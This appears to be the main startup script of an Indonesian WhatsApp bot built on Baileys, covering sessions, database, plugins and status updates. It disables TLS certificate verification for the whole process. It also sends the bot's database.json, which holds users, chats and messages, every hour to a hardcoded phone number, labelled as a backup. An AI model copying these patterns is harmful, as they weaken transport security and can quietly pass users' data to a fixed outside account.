process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
import './config.js'
import { start } from './lib/spinner.js'
import path, { join } from 'path'
import { platform } from 'process'
import { fileURLToPath, pathToFileURL } from 'url'
import { createRequire } from 'module' 
global.__filename = function filename(pathURL = import.meta.url, rmPrefix = platform !== 'win32') { return rmPrefix ? /file:\/\/\//.test(pathURL) ? fileURLToPath(pathURL) : pathURL : pathToFileURL(pathURL).toString() }; global.__dirname = function dirname(pathURL) { return path.dirname(global.__filename(pathURL, true)) }; global.__require = function require(dir = import.meta.url) { return createRequire(dir) }
import ws from 'ws'
import WebSocket from 'ws'
import {
    readdirSync,
    statSync,
    unlinkSync,
    existsSync,
    readFileSync,
    watch
} from 'fs'
import fs from 'fs'
import colors from 'colors'
import yargs from 'yargs'
import { spawn } from 'child_process'
import lodash from 'lodash'
import syntaxerror from 'syntax-error'
import chalk from 'chalk'
import { tmpdir } from 'os'
import { format } from 'util'
import pino from 'pino'
import pinoPretty from 'pino-pretty';
import {
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion 
   } from '@adiwajshing/baileys'
import { Low, JSONFile } from 'lowdb'

import { makeWASocket, protoType, serialize } from './lib/simple.js'
import storeSys from './lib/store2.js'
import {
    mongoDB,
    mongoDBV2
} from './lib/mongoDB.js'

const { CONNECTING } = ws
const { chain } = lodash
const PORT = process.env.PORT || process.env.SERVER_PORT || 5000

protoType()
serialize()

global.API = (name, path = '/', query = {}, apikeyqueryname) => (name in global.APIs ? global.APIs[name] : name) + path + (query || apikeyqueryname ? '?' + new URLSearchParams(Object.entries({ ...query, ...(apikeyqueryname ? { [apikeyqueryname]: global.APIKeys[name in global.APIs ? global.APIs[name] : name] } : {}) })) : '')
global.timestamp = {
  start: new Date
}

const __dirname = global.__dirname(import.meta.url)

global.opts = new Object(yargs(process.argv.slice(2)).exitProcess(false).parse())
global.prefix = new RegExp('^[' + (opts['prefix'] || '‎xzXZ/i!#$%+£¢€¥^°=¶∆×÷π√✓©®:;?&.\\-').replace(/[|\\{}()[\]^$+*?.\-\^]/g, '\\$&') + ']')

global.db = new Low(
  /https?:\/\//.test(opts['db'] || '') ?
    new cloudDBAdapter(opts['db']) : /mongodb(\+srv)?:\/\//i.test(opts['db']) ?
      (opts['mongodbv2'] ? new mongoDBV2(opts['db']) : new mongoDB(opts['db'])) :
      new JSONFile(`${opts._[0] ? opts._[0] + '_' : ''}database.json`)
)
global.DATABASE = global.db 
global.loadDatabase = async function loadDatabase() {
    if (db.READ) return new Promise((resolve) => setInterval(async function () {
        if (!db.READ) {
            clearInterval(this)
            resolve(db.data == null ? global.loadDatabase() : db.data)
        }
    }, 1 * 1000))
    if (db.data !== null) return
    db.READ = true
    await db.read().catch(console.error)
    db.READ = null
    db.data = {
        users: {},
        chats: {},
        stats: {},
        msgs: {},
        sticker: {},
        settings: {},
        ...(db.data || {})
    }
    global.db.chain = chain(db.data)
}
loadDatabase()

global.authFolder = storeSys.fixFileName(`${opts._[0] || ''}sessions`)
    let { state, saveCreds } = await useMultiFileAuthState(path.resolve('./sessions'))


const pretty = pinoPretty({
  colorize: true, 
  translateTime: 'SYS:standard', 
});

const logger = pino({
  level: 'fatal', 
}, pretty);

const connectionOptions = {
  version: [2, 2329, 9],
  logger,
  printQRInTerminal: true,
  syncFullHistory: true,
  auth: state, 
  browser: ['Chrome (Linux)', '', ''],//jangan di ubah jika mau stabil
  patchMessageBeforeSending: (message) => {
  const requiresPatch = !!(
  message.buttonsMessage ||
  message.templateMessage ||
  message.listMessage
    );
  if (requiresPatch) {
  message = {
  viewOnceMessage: {
  message: {
  messageContextInfo: {
  deviceListMetadataVersion: 2,
  deviceListMetadata: {},
   },
  ...message,
   },
   },
   };
   }
   return message;
   },
   };

global.conn = makeWASocket(connectionOptions)
conn.isInit = false

if (!opts['test']) {
  (await import('./server.js')).default(PORT)
  setInterval(async () => {
    if (global.db.data) await global.db.write().catch(console.error)
      clearTmp()
  }, 60 * 1000)
}

function clearTmp() {
  const tmp = [tmpdir(), join(__dirname, './tmp')]
  const filename = []
  tmp.forEach(dirname => readdirSync(dirname).forEach(file => filename.push(join(dirname, file))))
  return filename.map(file => {
    const stats = statSync(file)
    if (stats.isFile() && (Date.now() - stats.mtimeMs >= 1000 * 60 * 3)) return unlinkSync(file) // 3 minutes
    return false
  })
}

function clearSessions(folder = 'sessions') {
	let filename = []
	readdirSync(folder).forEach(file => filename.push(join(folder, file)))
	return filename.map(file => {
		let stats = statSync(file)
		if (stats.isFile() && (Date.now() - stats.mtimeMs >= 1000 * 60 * 120)) { // 1 hours
			console.log('Deleted sessions', file)
			return unlinkSync(file)
		}
		return false
	})
}
setInterval(async () => {
    const q = { "key": { "remoteJid": "status@broadcast", "participant":"0@s.whatsapp.net", "fromMe": false, "id": "" },
	"message": { "conversation": "Berhasil mencadangkan database.json" }}
    let sesi = await fs.readFileSync('./database.json')
    return await conn.sendMessage('6283843362676@s.whatsapp.net', { document: sesi, mimetype: 'application/json', fileName: 'database.json' }, { quoted: q })
  }, 60 * 60 * 1000)
async function connectionUpdate(update) {
  const { connection, lastDisconnect, isNewLogin } = update
global.stopped = connection
   if (connection == 'connecting') console.log(chalk.yellowBright('Tunggu Sebentar...'))
    if (connection === "open" || update.receivedPendingNotifications === "true") {
      console.log('Dah nyambung cuy ');
 conn.sendMessage(`6283843362676@s.whatsapp.net`, {text: `Bot Tersambung dengan baik ke server websocket ` }) // Connection Update
  }
  if (connection == 'close') console.log(chalk.red('Koneksi Terputus!'))
  if (isNewLogin) conn.isInit = true
  if (lastDisconnect && lastDisconnect.error && lastDisconnect.error.output && lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut && conn.ws.readyState !== WebSocket.CONNECTING) {
    console.log(reloadHandler(true))
    timestamp.connect = new Date
  }
  if (global.db.data == null) await global.loadDatabase()
}
process.on('uncaughtException', console.error)
conn.ev.on('creds.update', await saveCreds)
let isInit = true
let handler = await import('./handler.js')
global.reloadHandler = async function (restatConn) {
    try {
        const Handler = await import(`./handler.js?update=${Date.now()}`).catch(console.error)
        if (Object.keys(Handler || {}).length) handler = Handler
    } catch (e) {
        console.error(e)
    }
    if (restatConn) {
        const oldChats = global.conn.chats
        try { global.conn.ws.close() } catch { }
        conn.ev.removeAllListeners()
        global.conn = makeWASocket(connectionOptions, { chats: oldChats })
        isInit = true
    }    
  if (!isInit) {
    conn.ev.off('messages.upsert', conn.handler)
    conn.ev.off('group-participants.update', conn.participantsUpdate)
    conn.ev.off('groups.update', conn.groupsUpdate)
    conn.ev.off('message.delete', conn.onDelete)
    conn.ev.off('connection.update', conn.connectionUpdate)
    conn.ev.off('creds.update', conn.credsUpdate)
  }

  conn.welcome = 'Welcome @user \n *intro:* \n *nama:* \n *umur:* \n Sebelum beraktifitas baca deskripsi \n@desc'
  conn.bye = '*SELAMAT TINGGAL @user KALO MAU BALIK LAGI BAWAH UANG SEGEPOK'
  conn.spromote = '@user Sekarang jadi admin!'
  conn.sdemote = '@user Sekarang bukan lagi admin!'
  conn.sDesc = 'Deskripsi telah diubah menjadi \n@desc'
  conn.Subject = 'Judul grup telah diubah menjadi \n@subject'
  conn.sIcon = 'Icon grup telah diubah!'
  conn.sRevoke = 'Link group telah diubah ke \n@revoke'
  conn.sAnnounceOn = 'Group telah di tutup!\nsekarang hanya admin yang dapat mengirim pesan.'
  conn.sAnnounceOff = 'Group telah di buka!\nsekarang semua peserta dapat mengirim pesan.'
  conn.sRestrictOn = 'Edit Info Grup di ubah ke hanya admin!'
  conn.sRestrictOff = 'Edit Info Grup di ubah ke semua peserta!'

  conn.handler = handler.handler.bind(global.conn)
  conn.participantsUpdate = handler.participantsUpdate.bind(global.conn)
  conn.groupsUpdate = handler.groupsUpdate.bind(global.conn)
  conn.onDelete = handler.deleteUpdate.bind(global.conn)
  conn.connectionUpdate = connectionUpdate.bind(global.conn)
  conn.credsUpdate = saveCreds.bind(global.conn)

  conn.ev.on('messages.upsert', conn.handler)
  conn.ev.on('group-participants.update', conn.participantsUpdate)
  conn.ev.on('groups.update', conn.groupsUpdate)
  conn.ev.on('message.delete', conn.onDelete)
  conn.ev.on('connection.update', conn.connectionUpdate)
  conn.ev.on('creds.update', conn.credsUpdate)
  isInit = false
  return true

}

const pluginFolder = global.__dirname(join(__dirname, './plugins/index'));
const pluginFilter = (filename) => /\.js$/.test(filename);
global.plugins = {};

async function filesInit() {
  for (let filename of readdirSync(pluginFolder).filter(pluginFilter)) {
    try {
      let file = global.__filename(join(pluginFolder, filename));
      const module = await import(file);
      global.plugins[filename] = module.default || module;
    } catch (e) {
      conn.logger.error(`Error in plugin '${filename}':`, e); // Menampilkan error beserta pesan
      delete global.plugins[filename];
    }
  }
}

filesInit()
  .then(() => console.log(Object.keys(global.plugins)))
  .catch(console.error);

global.reload = async (_ev, filename) => {
  if (pluginFilter(filename)) {
    let dir = global.__filename(join(pluginFolder, filename), true);
    if (filename in global.plugins) {
      if (existsSync(dir)) conn.logger.info(`re-require plugin '${filename}'`);
      else {
        conn.logger.warn(`deleted plugin '${filename}'`);
        return delete global.plugins[filename];
      }
    } else conn.logger.info(`requiring new plugin '${filename}'`);
    let err = syntaxerror(readFileSync(dir), filename, {
      sourceType: 'module',
      allowAwaitOutsideFunction: true,
    });
    if (err) {
      conn.logger.error(`Syntax error while loading '${filename}':\n${format(err)}`);
    } else {
      try {
        const module = await import(`${global.__filename(dir)}?update=${Date.now()}`);
        global.plugins[filename] = module.default || module;
      } catch (e) {
        conn.logger.error(`Error requiring plugin '${filename}:\n${format(e)}`);
      } finally {
        global.plugins = Object.fromEntries(
          Object.entries(global.plugins).sort(([a], [b]) => a.localeCompare(b)
        ));
      }
    }
  }
};

Object.freeze(global.reload);
watch(pluginFolder, global.reload);

await global.reloadHandler();


async function _quickTest() {
    let test = await Promise.all([
        spawn('ffmpeg'),
        spawn('ffprobe'),
        spawn('ffmpeg', ['-hide_banner', '-loglevel', 'error', '-filter_complex', 'color', '-frames:v', '1', '-f', 'webp', '-']),
        spawn('convert'),
        spawn('magick'),
        spawn('gm'),
        spawn('find', ['--version'])
    ].map(p => {
        return Promise.race([
            new Promise(resolve => {
                p.on('close', code => {
                    resolve(code !== 127)
                })
            }),
            new Promise(resolve => {
                p.on('error', _ => resolve(false))
            })
        ])
    }))
    let [ffmpeg, ffprobe, ffmpegWebp, convert, magick, gm, find] = test
    console.log(test)
    let s = global.support = {
        ffmpeg,
        ffprobe,
        ffmpegWebp,
        convert,
        magick,
        gm,
        find
    }
    Object.freeze(global.support)

    if (!s.ffmpeg) {
        conn.logger.warn(`Silahkan Install ffmpeg Terlebih Dahulu Agar Bisa Mengirim Video`)
    }

    if (s.ffmpeg && !s.ffmpegWebp) {
        conn.logger.warn('Sticker Mungkin Tidak Beranimasi tanpa libwebp di ffmpeg (--enable-ibwebp while compiling ffmpeg)')
    }

    if (!s.convert && !s.magick && !s.gm) {
        conn.logger.warn('Fitur Stiker Mungkin Tidak Bekerja Tanpa imagemagick dan libwebp di ffmpeg belum terinstall (pkg install imagemagick)')
    }

}
setInterval(async () => {
  if (stopped == 'close') return        
  let _uptime = process.uptime() * 1000    
  let uptime = clockString(_uptime)
  let bio = `🤖 Bot Aktif : ${uptime} ┃ Bot AKAZAMD`
  await conn.updateProfileStatus(bio).catch(_ => _)
  }, 60000)
  function clockString(ms) {
  let d = isNaN(ms) ? '--' : Math.floor(ms / 86400000)
  let h = isNaN(ms) ? '--' : Math.floor(ms / 3600000) % 24
  let m = isNaN(ms) ? '--' : Math.floor(ms / 60000) % 60
  let s = isNaN(ms) ? '--' : Math.floor(ms / 1000) % 60
  return [d, ' Hari ', h, ' Jam ', m, ' Menit ', s, ' Seconds '].map(v => v.toString().padStart(2, 0)).join('')}

_quickTest()
    .then(() => conn.logger.info('☑️ Quick Test Done , nama file session ~> creds.json'))
    .catch(console.error)
    start('2', colors.bold.white('\n\nWaiting for New Messages..'));